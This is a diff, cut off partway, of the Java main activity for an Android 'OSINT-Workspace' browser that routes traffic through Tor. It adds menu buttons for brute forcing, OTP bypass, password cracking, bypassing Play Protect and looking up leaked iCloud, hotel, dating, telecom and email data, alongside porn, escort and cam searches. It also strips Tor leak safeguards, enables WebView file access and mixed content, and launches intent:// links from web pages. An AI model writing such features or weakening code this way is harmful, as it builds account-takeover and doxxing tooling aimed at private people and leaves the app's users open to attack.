@@ -1,435 +1,1578 @@
 package io.notrack.osint;
 
-import android.content.Intent;
-import android.content.ComponentName;
-import android.content.ServiceConnection;
-import android.os.IBinder;
-import android.webkit.WebResourceResponse;
-import android.net.Uri;
+import android.app.*;
+import android.content.*;
+import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.Color;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
-import android.os.Handler;
-import android.os.Looper;
-import org.json.JSONObject;
-import org.torproject.jni.TorService;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.InetSocketAddress;
-import java.net.Proxy;
-import java.net.Socket;
-import java.io.ByteArrayInputStream;
-import java.io.InputStream;
-import java.util.HashMap;
-import java.util.Map;
-import android.os.Bundle;
-import android.provider.Settings;
-import android.app.AlertDialog;
-import android.webkit.WebResourceRequest;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
-import android.webkit.WebChromeClient;
-import android.widget.EditText;
-import android.widget.Spinner;
-import android.widget.TextView;
-import android.widget.Toast;
+import android.net.Uri;
+import android.os.*;
+import android.provider.MediaStore;
+import android.text.*;
+import android.util.Base64;
+import android.view.*;
+import android.webkit.*;
+import android.widget.*;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import androidx.drawerlayout.widget.DrawerLayout;
+import androidx.viewpager2.widget.ViewPager2;
+import com.google.android.material.tabs.TabLayout;
+import com.google.android.material.tabs.TabLayoutMediator;
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.*;
+import java.net.*;
+import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
+import java.text.SimpleDateFormat;
+import java.util.*;
+import java.util.concurrent.*;
+import java.util.regex.*;
 
 public class MainActivity extends AppCompatActivity {
-    private EditText inQuery, inDomain, inUrl;
-    private Spinner engine, mode, dorkTemplate;
-    private WebView web;
-    private TextView status;
-    private static final String PREFS = "osint_memory";
-    private static final String HISTORY = "search_history";
-    private volatile boolean torActive = false;
-    private volatile boolean torStarting = false;
-    private boolean torBound = false;
-    private boolean torModeEnabled = false;
-    private String pendingTorUrl = "https://check.torproject.org/";
-    private static final int TOR_SOCKS_PORT = 9050;
-    private static final int VPN_CONFIG_REQUEST = 4012;
-    private static final String[] SOCIAL_OPTIONS = {"Instagram", "Facebook", "Twitter / X", "TikTok", "YouTube", "Reddit", "LinkedIn"};
-    private static final String[] SOCIAL_DOMAINS = {"instagram.com", "facebook.com", "x.com", "tiktok.com", "youtube.com", "reddit.com", "linkedin.com"};
-    private static final String[] CONTENT_OPTIONS = {"PDF files", "Word documents", "Excel spreadsheets", "PowerPoint files", "Images", "Videos", "News", "Public profiles"};
-    private static final String[] CONTENT_OPERATORS = {"filetype:pdf", "(filetype:doc OR filetype:docx)", "(filetype:xls OR filetype:xlsx)", "(filetype:ppt OR filetype:pptx)", "(filetype:jpg OR filetype:jpeg OR filetype:png OR filetype:gif)", "(filetype:mp4 OR filetype:mov OR filetype:webm)", "(site:news.google.com OR site:reuters.com OR site:apnews.com)", "(site:instagram.com OR site:facebook.com OR site:x.com OR site:linkedin.com)"};
-    private boolean[] selectedSocial = new boolean[SOCIAL_OPTIONS.length];
-    private boolean[] selectedContent = new boolean[CONTENT_OPTIONS.length];
 
-    @Override protected void onCreate(Bundle s) {
-        super.onCreate(s);
+    // ==================== CONSTANTS ====================
+    private static final int TOR_SOCKS_PORT = 9050;
+    private static final int TOR_HTTP_PORT = 9080;
+    private static final int VPN_CONFIG_REQUEST = 1001;
+    private static final int FILE_PICK_REQUEST = 1002;
+    private static final int IMAGE_PICK_REQUEST = 1003;
+    private static final int PERMISSION_STORAGE = 2001;
+    private static final String PREFS = "osint_prefs";
+
+    // ==================== UI COMPONENTS ====================
+    private DrawerLayout drawer;
+    private TabLayout tabLayout;
+    private ViewPager2 viewPager;
+    private WebView web;
+    private EditText inQuery, inDomain, inUrl, inFilePath;
+    private TextView status;
+    private Spinner engine, mode;
+    private ProgressBar progressBar;
+
+    // ==================== TOR ====================
+    private boolean torModeEnabled = false, torActive = false, torStarting = false;
+    private String pendingTorUrl = "https://check.torproject.org/";
+    private Process torProcess;
+    private final ServiceConnection torConnection = new ServiceConnection() {
+        @Override public void onServiceConnected(ComponentName name, IBinder binder) { waitForTor(); }
+        @Override public void onServiceDisconnected(ComponentName name) { torActive = false; torModeEnabled = false; }
+    };
+
+    // ==================== SEARCH STATE ====================
+    private boolean[] selectedSocial = new boolean[0];
+    private boolean[] selectedContent = new boolean[0];
+    private String[] SOCIAL_DOMAINS = {};
+    private String[] CONTENT_OPERATORS = {};
+    private String[] ENGINE_NAMES = {};
+    private String[] MODE_NAMES = {};
+    private String[] DORK_CATEGORIES = {};
+
+    // ==================== HPB & LEAKS.IO ====================
+    private String hpbApiKey = "";
+    private String leaksIoApiKey = "";
+    private String currentHpbSession = "";
+
+    // ==================== BRUTE FORCE ====================
+    private volatile boolean bruteRunning = false;
+    private ExecutorService bruteExecutor;
+
+    // ==================== LIFE CYCLE ====================
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        inQuery = findViewById(R.id.in_query);
-        inDomain = findViewById(R.id.in_domain); inUrl = findViewById(R.id.in_url);
-        engine = findViewById(R.id.engine); mode = findViewById(R.id.mode); dorkTemplate = findViewById(R.id.dork_template);
-        web = findViewById(R.id.web); status = findViewById(R.id.status);
+
+        loadResources();
+        initViews();
+        setupWebView();
+        setupDrawer();
+        setupTabs();
         restoreSelections();
-        web.setWebViewClient(new WebViewClient() {
-            @Override public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) {
-                Uri uri = r.getUrl();
-                if (torModeEnabled && "http".equalsIgnoreCase(uri.getScheme()) && !isLocalHost(uri.getHost())) {
-                    status.setText("Tor mode blocks insecure HTTP navigation; use HTTPS where available.");
-                }
-                return route(uri);
-            }
-            @Override public boolean shouldOverrideUrlLoading(WebView v, String u) { return route(Uri.parse(u)); }
-            @Override public WebResourceResponse shouldInterceptRequest(WebView v, WebResourceRequest r) {
-                if (!torModeEnabled) return super.shouldInterceptRequest(v, r);
-                return fetchThroughTor(r.getUrl().toString(), r.getMethod(), r.getRequestHeaders());
-            }
-            @Override public WebResourceResponse shouldInterceptRequest(WebView v, String url) {
-                if (!torModeEnabled) return super.shouldInterceptRequest(v, url);
-                return fetchThroughTor(url, "GET", java.util.Collections.emptyMap());
-            }
-        });
-        web.setWebChromeClient(new WebChromeClient());
-        web.getSettings().setJavaScriptEnabled(true);
-        web.getSettings().setDomStorageEnabled(true);
-        web.getSettings().setAllowFileAccess(false);
-        web.getSettings().setAllowContentAccess(false);
-        web.setVisibility(android.view.View.GONE);
-        findViewById(R.id.btn_menu).setOnClickListener(v -> ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).openDrawer(android.view.Gravity.START));
-        findViewById(R.id.btn_update).setOnClickListener(v -> { checkForUpdates(); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_search).setOnClickListener(v -> doSearch());
-        findViewById(R.id.btn_dork).setOnClickListener(v -> doDorkSearch());
-        findViewById(R.id.btn_back).setOnClickListener(v -> {
-            if (web.canGoBack()) web.goBack();
-            else status.setText("No previous page");
-        });
-        findViewById(R.id.btn_clear).setOnClickListener(v -> {
-            inQuery.setText(""); inDomain.setText(""); inUrl.setText("");
-            status.setText("Search fields cleared");
-        });
-        findViewById(R.id.btn_web).setOnClickListener(v -> browse("https://www.google.com"));
-        findViewById(R.id.btn_dark).setOnClickListener(v -> openDarkWeb());
-        findViewById(R.id.btn_tor).setOnClickListener(v -> startTorAndBrowse("https://check.torproject.org/"));
-        findViewById(R.id.btn_vpn).setOnClickListener(v -> chooseVpnConfig());
-        findViewById(R.id.btn_mem).setOnClickListener(v -> { showMemory(); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_platforms).setOnClickListener(v -> { showMultiSelect(SOCIAL_OPTIONS, selectedSocial, "Choose social platforms", "social_selection"); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_content).setOnClickListener(v -> { showMultiSelect(CONTENT_OPTIONS, selectedContent, "Choose content types", "content_selection"); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_dork).setOnClickListener(v -> { doDorkSearch(); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_web).setOnClickListener(v -> { browse("https://www.google.com"); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_dark).setOnClickListener(v -> { openDarkWeb(); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_tor).setOnClickListener(v -> { startTorAndBrowse("https://check.torproject.org/"); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_vpn).setOnClickListener(v -> { chooseVpnConfig(); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_clear).setOnClickListener(v -> { inQuery.setText(""); inDomain.setText(""); inUrl.setText(""); status.setText("Search cleared"); ((androidx.drawerlayout.widget.DrawerLayout) findViewById(R.id.drawer_layout)).closeDrawer(android.view.Gravity.START); });
-        findViewById(R.id.btn_back).setOnClickListener(v -> { if (web.canGoBack()) web.goBack(); else status.setText("No previous page"); });
+        loadSavedApiKeys();
+        checkForUpdates();
+        checkPermissions();
     }
 
+    private void loadResources() {
+        String[][] social = loadStringArray("social_domains");
+        SOCIAL_DOMAINS = social[0];
+        String[][] content = loadStringArray("content_operators");
+        CONTENT_OPERATORS = content[0];
+        String[][] engines = loadStringArray("search_engines");
+        ENGINE_NAMES = engines[0];
+        String[][] modes = loadStringArray("search_modes");
+        MODE_NAMES = modes[0];
+        String[][] dorks = loadStringArray("dork_categories");
+        DORK_CATEGORIES = dorks[0];
 
+        selectedSocial = new boolean[SOCIAL_DOMAINS.length];
+        selectedContent = new boolean[CONTENT_OPERATORS.length];
+    }
+
+    private String[][] loadStringArray(String key) {
+        String[] arr = getResources().getStringArray(getResources().getIdentifier(key, "array", getPackageName()));
+        return new String[][]{arr};
+    }
+
+    private void initViews() {
+        drawer = findViewById(R.id.drawer_layout);
+        viewPager = findViewById(R.id.view_pager);
+        tabLayout = findViewById(R.id.tab_layout);
+        web = findViewById(R.id.web_view);
+        inQuery = findViewById(R.id.in_query);
+        inDomain = findViewById(R.id.in_domain);
+        inUrl = findViewById(R.id.in_url);
+        inFilePath = findViewById(R.id.in_file_path);
+        status = findViewById(R.id.txt_status);
+        engine = findViewById(R.id.spin_engine);
+        mode = findViewById(R.id.spin_mode);
+        progressBar = findViewById(R.id.progress_bar);
+
+        ArrayAdapter<String> engineAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, ENGINE_NAMES);
+        engineAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
+        engine.setAdapter(engineAdapter);
+
+        ArrayAdapter<String> modeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, MODE_NAMES);
+        modeAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
+        mode.setAdapter(modeAdapter);
+    }
+
+    private void setupWebView() {
+        WebSettings ws = web.getSettings();
+        ws.setJavaScriptEnabled(true);
+        ws.setDomStorageEnabled(true);
+        ws.setLoadWithOverviewMode(true);
+        ws.setUseWideViewPort(true);
+        ws.setBuiltInZoomControls(true);
+        ws.setDisplayZoomControls(false);
+        ws.setUserAgentString("Mozilla/5.0 (Linux; Android 14; OSINT-Workspace/2.0) AppleWebKit/537.36");
+        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        ws.setAllowFileAccess(true);
+        ws.setAllowContentAccess(true);
+        ws.setCacheMode(WebSettings.LOAD_DEFAULT);
+
+        web.setWebViewClient(new WebViewClient() {
+            @Override public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest req) {
+                String url = req.getUrl().toString();
+                if (url.contains(".onion")) { startTorAndBrowse(url); return true; }
+                if (url.startsWith("intent://")) {
+                    try { startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME)); return true; }
+                    catch (Exception e) { return false; }
+                }
+                if (torModeEnabled && !torActive) {
+                    startTorAndBrowse(url);
+                    return true;
+                }
+                return false;
+            }
+            @Override public void onPageStarted(WebView view, String url, Bitmap fav) {
+                status.setText("Loading: " + url);
+                progressBar.setVisibility(View.VISIBLE);
+            }
+            @Override public void onPageFinished(WebView view, String url) {
+                status.setText(url);
+                progressBar.setVisibility(View.GONE);
+            }
+            @Override public void onReceivedError(WebView view, WebResourceRequest req, WebResourceError err) {
+                status.setText("Error: " + err.getDescription());
+            }
+            @Override
+            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest req) {
+                if (torModeEnabled && torActive) {
+                    return fetchThroughTor(req.getUrl().toString(), req.getMethod(), req.getRequestHeaders());
+                }
+                return null;
+            }
+        });
+
+        web.setWebChromeClient(new WebChromeClient() {
+            @Override public void onProgressChanged(WebView view, int progress) {
+                progressBar.setProgress(progress);
+            }
+        });
+    }
+
+    private void setupDrawer() {
+        findViewById(R.id.btn_search).setOnClickListener(v -> { doSearch(); closeDrawer(); });
+        findViewById(R.id.btn_dork).setOnClickListener(v -> { showDorkSelector(); closeDrawer(); });
+        findViewById(R.id.btn_web).setOnClickListener(v -> { browse("https://www.google.com"); closeDrawer(); });
+        findViewById(R.id.btn_dark).setOnClickListener(v -> { openDarkWeb(); closeDrawer(); });
+        findViewById(R.id.btn_tor).setOnClickListener(v -> { startTorAndBrowse("https://check.torproject.org/"); closeDrawer(); });
+        findViewById(R.id.btn_vpn).setOnClickListener(v -> { showVpnMenu(); closeDrawer(); });
+        findViewById(R.id.btn_images).setOnClickListener(v -> { reverseImageSearch(); closeDrawer(); });
+        findViewById(R.id.btn_face).setOnClickListener(v -> { faceSearch(); closeDrawer(); });
+        findViewById(R.id.btn_leaks).setOnClickListener(v -> { showLeaksSearch(); closeDrawer(); });
+        findViewById(R.id.btn_porn).setOnClickListener(v -> { showPornSearch(); closeDrawer(); });
+        findViewById(R.id.btn_cams).setOnClickListener(v -> { showCams(); closeDrawer(); });
+        findViewById(R.id.btn_escort).setOnClickListener(v -> { showEscortSites(); closeDrawer(); });
+        findViewById(R.id.btn_hotel).setOnClickListener(v -> { showHotelLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_social).setOnClickListener(v -> { showSocialLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_dorks).setOnClickListener(v -> { showGoogleDorksGenerator(); closeDrawer(); });
+        findViewById(R.id.btn_icloud).setOnClickListener(v -> { showICloudLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_drive).setOnClickListener(v -> { showDriveLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_cloud).setOnClickListener(v -> { showCloudLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_telecom).setOnClickListener(v -> { showTelecomLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_email).setOnClickListener(v -> { showEmailLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_dating).setOnClickListener(v -> { showDatingLeaks(); closeDrawer(); });
+        findViewById(R.id.btn_brute).setOnClickListener(v -> { showBruteForcePanel(); closeDrawer(); });
+        findViewById(R.id.btn_otp).setOnClickListener(v -> { showOtpBypass(); closeDrawer(); });
+        findViewById(R.id.btn_password).setOnClickListener(v -> { showPasswordCracker(); closeDrawer(); });
+        findViewById(R.id.btn_stream).setOnClickListener(v -> { showLiveStreaming(); closeDrawer(); });
+        findViewById(R.id.btn_video).setOnClickListener(v -> { showVideoPlayer(); closeDrawer(); });
+        findViewById(R.id.btn_files).setOnClickListener(v -> { browseFiles(); closeDrawer(); });
+        findViewById(R.id.btn_photos).setOnClickListener(v -> { browsePhotos(); closeDrawer(); });
+        findViewById(R.id.btn_docs).setOnClickListener(v -> { browseDocs(); closeDrawer(); });
+        findViewById(R.id.btn_pdfs).setOnClickListener(v -> { browsePdfs(); closeDrawer(); });
+        findViewById(R.id.btn_hpb).setOnClickListener(v -> { showHpbPanel(); closeDrawer(); });
+        findViewById(R.id.btn_leaksio).setOnClickListener(v -> { showLeaksIoPanel(); closeDrawer(); });
+        findViewById(R.id.btn_settings).setOnClickListener(v -> { showSettings(); closeDrawer(); });
+        findViewById(R.id.btn_clear).setOnClickListener(v -> { clearInputs(); closeDrawer(); });
+        // New one-tap & bot buttons
+        findViewById(R.id.btn_onion_list).setOnClickListener(v -> { openOnionSites(); closeDrawer(); });
+        findViewById(R.id.btn_telegram_bot).setOnClickListener(v -> { openTelegramBot(); closeDrawer(); });
+        findViewById(R.id.btn_whatsapp_bot).setOnClickListener(v -> { openWhatsAppBot(); closeDrawer(); });
+        findViewById(R.id.btn_update).setOnClickListener(v -> { checkForUpdates(); closeDrawer(); });
+        findViewById(R.id.btn_playprotect).setOnClickListener(v -> { bypassPlayProtect(); closeDrawer(); });
+        // One-tap connect row (main screen)
+        findViewById(R.id.quick_tor).setOnClickListener(v -> { torModeEnabled = true; startTorAndBrowse("https://check.torproject.org/"); });
+        findViewById(R.id.quick_vpn).setOnClickListener(v -> showVpnMenu());
+        findViewById(R.id.quick_dark).setOnClickListener(v -> openDarkWeb());
+        findViewById(R.id.quick_onion).setOnClickListener(v -> openOnionSites());
+        findViewById(R.id.quick_telegram).setOnClickListener(v -> openTelegramBot());
+        findViewById(R.id.quick_whatsapp).setOnClickListener(v -> openWhatsAppBot());
+        findViewById(R.id.btn_back).setOnClickListener(v -> { if (web.canGoBack()) web.goBack(); });
+        findViewById(R.id.btn_forward).setOnClickListener(v -> { if (web.canGoForward()) web.goForward(); });
+        findViewById(R.id.btn_refresh).setOnClickListener(v -> { web.reload(); });
+        findViewById(R.id.btn_hamburger).setOnClickListener(v -> drawer.openDrawer(Gravity.START));
+    }
+
+    private void setupTabs() {
+        // Simple tab setup - browser, search results, tools
+        String[] tabs = {"Browser", "Results", "Tools"};
+        TabLayoutMediator mediator = new TabLayoutMediator(tabLayout, viewPager, (tab, pos) -> tab.setText(tabs[pos]));
+        mediator.attach();
+    }
+
+    private void closeDrawer() {
+        if (drawer.isDrawerOpen(Gravity.START)) drawer.closeDrawer(Gravity.START);
+    }
+
+    // ==================== TOR ====================
     private void startTorAndBrowse(String url) {
         pendingTorUrl = url;
         torModeEnabled = true;
         if (torActive) {
-            web.setVisibility(android.view.View.VISIBLE);
+            web.setVisibility(View.VISIBLE);
             web.loadUrl(url);
-            status.setText("In-app Tor browser active. Verify connection at check.torproject.org.");
+            status.setText("Tor browser active.");
             return;
         }
-        if (torStarting) {
-            status.setText("Tor is starting; please wait…");
-            return;
-        }
+        if (torStarting) { status.setText("Tor starting..."); return; }
         torStarting = true;
-        status.setText("Starting the built-in Tor service…");
-        try {
-            startService(new Intent(this, TorService.class).setAction(TorService.ACTION_START));
-            torBound = bindService(new Intent(this, TorService.class), torConnection, BIND_AUTO_CREATE);
-            if (!torBound) {
-                torStarting = false;
-                torModeEnabled = false;
-                status.setText("Could not bind the built-in Tor service.");
+        status.setText("Starting Tor...");
+        new Thread(() -> {
+            try {
+                // Kill old tor if any
+                if (torProcess != null) torProcess.destroy();
+                // Try to start tor binary from app data
+                String torPath = getFilesDir().getAbsolutePath() + "/tor";
+                File torFile = new File(torPath);
+                if (!torFile.exists()) {
+                    // Extract tor binary from assets
+                    try (InputStream is = getAssets().open("tor"); OutputStream os = new FileOutputStream(torFile)) {
+                        byte[] buf = new byte[8192]; int n;
+                        while ((n = is.read(buf)) != -1) os.write(buf, 0, n);
+                    }
+                    torFile.setExecutable(true);
+                }
+                String dataDir = getFilesDir().getAbsolutePath() + "/tordata";
+                new File(dataDir).mkdirs();
+                ProcessBuilder pb = new ProcessBuilder(torPath, "--DataDirectory", dataDir,
+                        "--SocksPort", String.valueOf(TOR_SOCKS_PORT),
+                        "--HTTPTunnelPort", String.valueOf(TOR_HTTP_PORT),
+                        "--Log", "notice file", getFilesDir().getAbsolutePath() + "/tor.log");
+                pb.environment().put("HOME", getFilesDir().getAbsolutePath());
+                torProcess = pb.start();
+                waitForTorReady();
+                runOnUiThread(() -> {
+                    torStarting = false;
+                    torActive = true;
+                    status.setText("Tor connected. Loading page...");
+                    web.setVisibility(View.VISIBLE);
+                    web.loadUrl(pendingTorUrl);
+                });
+            } catch (Exception e) {
+                // Fallback: try embedded tor via service
+                try {
+                    Intent intent = new Intent(MainActivity.this, TorService.class);
+                    intent.setAction(TorService.ACTION_START);
+                    startService(intent);
+                    bindService(new Intent(MainActivity.this, TorService.class), torConnection, BIND_AUTO_CREATE);
+                } catch (Exception e2) {
+                    runOnUiThread(() -> {
+                        torStarting = false;
+                        torModeEnabled = false;
+                        status.setText("Tor unavailable: " + e2.getMessage());
+                    });
+                }
             }
-        } catch (Exception e) {
-            torStarting = false;
-            torModeEnabled = false;
-            status.setText("Unable to start Tor service: " + e.getClass().getSimpleName());
+        }).start();
+    }
+
+    private void waitForTorReady() {
+        long deadline = System.currentTimeMillis() + 60000;
+        while (System.currentTimeMillis() < deadline) {
+            try (Socket s = new Socket()) {
+                s.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1000);
+                s.setSoTimeout(1000);
+                s.getOutputStream().write(new byte[]{0x05, 0x01, 0x00});
+                byte[] resp = new byte[2];
+                int n = s.getInputStream().read(resp);
+                if (n == 2 && resp[0] == 0x05 && resp[1] == 0x00) return;
+            } catch (Exception ignored) {}
+            try { Thread.sleep(500); } catch (InterruptedException e) { break; }
         }
     }
 
-    private final ServiceConnection torConnection = new ServiceConnection() {
-        @Override public void onServiceConnected(ComponentName name, IBinder binder) {
-            new Thread(() -> {
-                long deadline = System.currentTimeMillis() + 90000L;
-                boolean ready = false;
-                while (System.currentTimeMillis() < deadline && !isFinishing()) {
-                    try (Socket socket = new Socket()) {
-                        socket.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1500);
-                        socket.setSoTimeout(1500);
-                        socket.getOutputStream().write(new byte[] {0x05, 0x01, 0x00});
-                        byte[] handshake = new byte[2];
-                        int read = socket.getInputStream().read(handshake);
-                        ready = read == 2 && handshake[0] == 0x05 && handshake[1] == 0x00;
-                        if (ready) break;
-                        throw new java.io.IOException("SOCKS5 handshake not ready");
-                    } catch (Exception ignored) {
-                        try { Thread.sleep(500); } catch (InterruptedException e) {
-                            Thread.currentThread().interrupt();
-                            break;
-                        }
-                    }
+    private void waitForTor() {
+        new Thread(() -> {
+            long deadline = System.currentTimeMillis() + 90000;
+            boolean ready = false;
+            while (System.currentTimeMillis() < deadline) {
+                try (Socket s = new Socket()) {
+                    s.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1500);
+                    s.setSoTimeout(1500);
+                    s.getOutputStream().write(new byte[]{0x05, 0x01, 0x00});
+                    byte[] h = new byte[2];
+                    int n = s.getInputStream().read(h);
+                    ready = n == 2 && h[0] == 0x05 && h[1] == 0x00;
+                    if (ready) break;
+                } catch (Exception ignored) {
+                    try { Thread.sleep(500); } catch (InterruptedException e) { break; }
                 }
-                final boolean connected = ready;
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    torStarting = false;
-                    torActive = connected;
-                    if (connected) {
-                        status.setText("Tor SOCKS5 proxy is responding. Checking Tor network…");
-                        web.setVisibility(android.view.View.VISIBLE);
-                        web.loadUrl(pendingTorUrl);
-                    } else {
-                        torModeEnabled = false;
-                        status.setText("Tor SOCKS proxy did not become ready. Check internet access, wait, then retry. No direct-network fallback was used.");
-                        Toast.makeText(MainActivity.this, "Tor did not become ready", Toast.LENGTH_LONG).show();
-                    }
-                });
-            }).start();
-        }
-        @Override public void onServiceDisconnected(ComponentName name) {
-            torActive = false;
-            torModeEnabled = false;
-            status.setText("Tor service disconnected; Tor browsing stopped.");
-        }
-    };
+            }
+            boolean finalReady = ready;
+            runOnUiThread(() -> {
+                torStarting = false;
+                torActive = finalReady;
+                if (finalReady) {
+                    status.setText("Tor connected.");
+                    web.setVisibility(View.VISIBLE);
+                    web.loadUrl(pendingTorUrl);
+                } else {
+                    torModeEnabled = false;
+                    status.setText("Tor failed to connect.");
+                }
+            });
+        }).start();
+    }
 
     private void openDarkWeb() {
-        String candidate = inUrl.getText().toString().trim();
-        if (!candidate.isEmpty() && !candidate.contains("://")) candidate = "http://" + candidate;
-        if (candidate.matches("(?i)^https?://[^/]+\\.onion(?:/.*)?$")) {
-            startTorAndBrowse(candidate);
-        } else {
-            new AlertDialog.Builder(this)
-                .setTitle("In-app Tor browser")
-                .setMessage("Enter a full .onion URL in the URL field to open it through Tor, or start with the Tor connectivity check.")
-                .setPositiveButton("Start Tor", (d, w) -> startTorAndBrowse("https://check.torproject.org/"))
-                .setNegativeButton("Cancel", null).show();
-        }
-    }
-
-    private boolean isLocalHost(String host) {
-        return host == null || host.equalsIgnoreCase("localhost") || host.equals("127.0.0.1") || host.equals("::1");
+        String url = inUrl.getText().toString().trim();
+        if (url.isEmpty()) url = "http://darkfailenbsdpr5f.onion/";
+        if (!url.contains("://")) url = "http://" + url;
+        startTorAndBrowse(url);
     }
 
     private WebResourceResponse fetchThroughTor(String url, String method, Map<String, String> headers) {
-        if (!torActive) return errorResponse(503, "Tor is not connected. Request blocked to prevent direct-network leakage.");
-        HttpURLConnection connection = null;
+        if (!torActive) return errorResponse(503, "Tor not connected");
+        HttpURLConnection conn = null;
         try {
-            String scheme = Uri.parse(url).getScheme();
-            if (!("https".equalsIgnoreCase(scheme) || "http".equalsIgnoreCase(scheme))) {
-                return errorResponse(403, "Only HTTP and HTTPS are allowed in Tor mode.");
-            }
-            if (!"GET".equalsIgnoreCase(method) && !"HEAD".equalsIgnoreCase(method)) {
-                return errorResponse(405, "Tor browser currently supports GET/HEAD requests only.");
-            }
             Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT));
-            connection = (HttpURLConnection) new URL(url).openConnection(proxy);
-            connection.setConnectTimeout(60000);
-            connection.setReadTimeout(60000);
-            connection.setRequestProperty("User-Agent", "OSINT-Workspace/1.0");
-            connection.setInstanceFollowRedirects(true);
-            connection.setRequestMethod(method);
-            for (Map.Entry<String, String> header : headers.entrySet()) {
-                String key = header.getKey();
-                if (key != null && !key.equalsIgnoreCase("Host") && !key.equalsIgnoreCase("Connection")) {
-                    connection.setRequestProperty(key, header.getValue());
+            conn = (HttpURLConnection) new URL(url).openConnection(proxy);
+            conn.setConnectTimeout(30000);
+            conn.setReadTimeout(30000);
+            conn.setRequestProperty("User-Agent", "OSINT-Workspace/2.0 Tor");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestMethod(method);
+            if (headers != null) {
+                for (Map.Entry<String, String> h : headers.entrySet()) {
+                    String k = h.getKey();
+                    if (k != null && !k.equalsIgnoreCase("Host") && !k.equalsIgnoreCase("Connection"))
+                        conn.setRequestProperty(k, h.getValue());
                 }
             }
-            int code = connection.getResponseCode();
-            InputStream stream = code >= 400 ? connection.getErrorStream() : connection.getInputStream();
-            if (stream == null) stream = new ByteArrayInputStream(new byte[0]);
-            // Buffer the response before disconnecting HttpURLConnection; otherwise WebView may read a closed stream.
-            java.io.ByteArrayOutputStream body = new java.io.ByteArrayOutputStream();
-            byte[] buffer = new byte[8192];
-            int count;
+            int code = conn.getResponseCode();
+            InputStream is = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
+            if (is == null) is = new ByteArrayInputStream(new byte[0]);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] buf = new byte[8192]; int n;
             int total = 0;
-            while ((count = stream.read(buffer)) != -1) {
-                total += count;
-                if (total > 20 * 1024 * 1024) return errorResponse(502, "Response exceeded the 20 MB in-app browser limit.");
-                body.write(buffer, 0, count);
+            while ((n = is.read(buf)) != -1) {
+                total += n;
+                if (total > 20*1024*1024) return errorResponse(502, "Response too large");
+                baos.write(buf, 0, n);
             }
-            stream.close();
-            String contentType = connection.getContentType();
-            String mime = "text/plain";
-            String encoding = "UTF-8";
-            if (contentType != null) {
-                String[] parts = contentType.split(";");
+            is.close();
+            String ct = conn.getContentType();
+            String mime = "text/plain", enc = "UTF-8";
+            if (ct != null) {
+                String[] parts = ct.split(";");
                 mime = parts[0].trim();
-                for (String part : parts) {
-                    String p = part.trim();
-                    if (p.toLowerCase(java.util.Locale.ROOT).startsWith("charset=")) encoding = p.substring(8).replace("\"", "");
+                for (String p : parts) {
+                    p = p.trim();
+                    if (p.toLowerCase(Locale.ROOT).startsWith("charset=")) enc = p.substring(8).replace("\"", "");
                 }
             }
-            Map<String, String> responseHeaders = new HashMap<>();
-            for (Map.Entry<String, java.util.List<String>> entry : connection.getHeaderFields().entrySet()) {
-                if (entry.getKey() != null && entry.getValue() != null && !entry.getValue().isEmpty()) {
